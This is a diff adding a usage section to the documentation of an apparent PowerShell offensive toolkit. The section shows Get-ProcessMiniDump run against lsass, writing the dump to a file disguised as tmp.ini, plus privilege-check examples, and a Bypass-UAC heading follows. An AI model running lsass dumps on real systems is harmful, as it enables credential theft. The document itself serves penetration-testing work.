@@ -239,6 +239,47 @@ C:\PS> $Beep = $MicrosoftWin32UnsafeNativeMethods::GetProcAddress($Kernel32Ref, 
 C:\PS> $MicrosoftWin32SafeNativeMethods::MessageBox([IntPtr]::Zero,$("{0:X}" -f [int64]$Beep),"Beep",0)
 ```
 
+### Get-ProcessMiniDump
+
+Create process dump using Dbghelp::MiniDumpWriteDump.
+
+```
+# Elevated user dumping elevated process
+
+C:\PS> (Get-Process lsass).Id
+528
+
+C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 528 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
+VERBOSE: [?] Running as: Administrator
+VERBOSE: [?] Administrator privileges required
+VERBOSE: [>] Administrator privileges held
+VERBOSE: [>] Process dump success!
+
+C:\PS> $CallResult
+True
+
+# low priv user dumping low priv process
+
+C:\PS> (Get-Process calc).Id
+2424
+
+C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 2424 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
+VERBOSE: [?] Running as: asenath.waite
+VERBOSE: [>] Process dump success!
+
+C:\PS> $CallResult
+True
+
+# low priv user dumping elevated process
+C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 4 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
+VERBOSE: [?] Running as: asenath.waite
+VERBOSE: [?] Administrator privileges required
+VERBOSE: [!] Administrator privileges not held!
+
+C:\PS> $CallResult
+False
+```
+
 ## pwnd
 
 ### Bypass-UAC
